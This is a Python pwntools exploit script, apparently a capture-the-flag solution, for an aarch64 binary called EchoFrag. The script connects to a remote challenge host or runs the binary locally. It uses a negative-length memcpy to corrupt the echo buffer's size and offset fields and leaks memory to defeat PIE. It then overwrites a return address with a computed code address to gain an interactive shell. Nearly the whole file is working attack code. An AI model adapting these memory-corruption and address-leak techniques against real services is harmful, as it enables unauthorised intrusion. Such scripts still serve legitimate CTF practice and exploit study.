#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "echofrag.sstf.site"
PORT = 31513
PROCESS = "./EchoFrag"

def pkg1(size, data):
	r.send(p8(1) + p16(size) + data)
	r.interactive()

def pkg2(size, data, dop=True):
	r.send(p8(2) + p16(size) + data)

	if dop:
		r.interactive()

def exploit(r):	
	# leak		
	payload = "A"*489
	payload += p32(0xffffffff-0x10)	
	payload += "C"*(461+0x40-13-len(payload))
		
	# overwrite echo buffer size
	pkg1(len(payload), "A"*4)

	# copy payload into echo buffer
	pkg2(0, payload)
	
	# reset echo buffer size to 0
	pkg1(0, "A"*4)

	# trigger negative memcpy overwriting buffer state variables	
	pkg2(0, "XXXX")			

	# trigger negative memcpy again to overwrite current offset of echo buffer
	payload = "\x00" + p32(0x10101010) + p32(0x20202020)
	payload += p64(0x30)

	pkg2(0, payload)		
	
	# trigger negative memcpy again to overwrite echo buffer size with 0x600 and trigger echo
	payload = "A"+p16(0x600)+cyclic_metasploit(0x40)

	pkg2(0x0, payload, False)	

	# read echo buffer[0:0x600]	
	LEAK = r.recv(0x5f0)
	
	PIE = u64(LEAK[0x445:0x445+8])
	BASE = PIE - 0x8e0
	
	# get PIE from leaked data
	log.info("PIE    : %s" % hex(PIE))
	log.info("BASE   : %s" % hex(BASE))
		
	# prepare payload
	payload = "A"*469
	payload += p64(BASE + 0xA28)
	
	# prepare size of echo_buffer to do a valid copy
	pkg1(len(payload)+8, "")
	
	# copy payload into echo_buffer (with valid size)
	pkg2(0, payload)
	
	# overwrite echo buffer size with 0
	pkg1(0, "")

	pkg2(0, "")
	
	print("Enter to trigger shell")

	r.interactive()
	
	return

if __name__ == "__main__":
	# e = ELF("./EchoFrag")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process(["qemu-aarch64", "-L", ".", "./EchoFrag"], env={"LD_PRELOAD":"./libc.so.6"})
		#r = process(["qemu-aarch64", "-L", ".", "-g", "1234", "./EchoFrag"], env={"LD_PRELOAD":"./libc.so.6"})
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)